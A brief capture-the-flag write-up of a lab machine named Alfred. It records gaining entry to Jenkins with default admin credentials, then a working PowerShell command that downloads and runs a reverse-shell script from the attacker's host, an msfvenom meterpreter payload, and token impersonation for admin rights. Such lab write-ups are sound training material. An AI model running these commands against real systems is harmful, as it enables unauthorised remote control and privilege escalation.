# ALFRED
```
IP = 10.10.171.58
```

+ Ran initial nmap scan and gobuster
+ Found three ports open [80, 3389, 8080]
+ Jenkins on 8080
+ robots.txt on 8080 
```
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```
+ Tried to bruteforce the username and password with hydra, burpsuite, etc
+ Tried gobuster, nikto and searchsploit dir traversal
+ None worked, randomly guessed username and password and it worked!
+ `admin:admin`
+ Found a location in the GUI that allows me to execute windows batch command at `/job/project/configure`
+ Started serving the opt folder containing the reverse powershell script using python
+ Got access into the system as bruce\alfred using `powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.4.238:9001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.4.238 -Port 9002`
+ Created a payload using `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.4.238 LPORT=9005 -f exe -o shell-name.exe prependmigrateprocess=explorer.exe prependmigrate=true`
+ Moved the payload to opt/windows folder and downloaded to the machine using `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.4.238:9001/shell-name.exe','shell-name.exe')"`
+ Setup reverse handler with LHOST as 10.11.4.238 and LPORT as 9005
+ Ran the exe using `Start-Process "shell-name.exe"` and caught the reverse shell as meterpreter
+ Now privilege escalation using token impersonation
+ List tokens using `list_tokens -g`
+ Used `impersonate_token "BUILTIN\Administrators"` to get admin priv
+ Can also use getsystem to obtain admin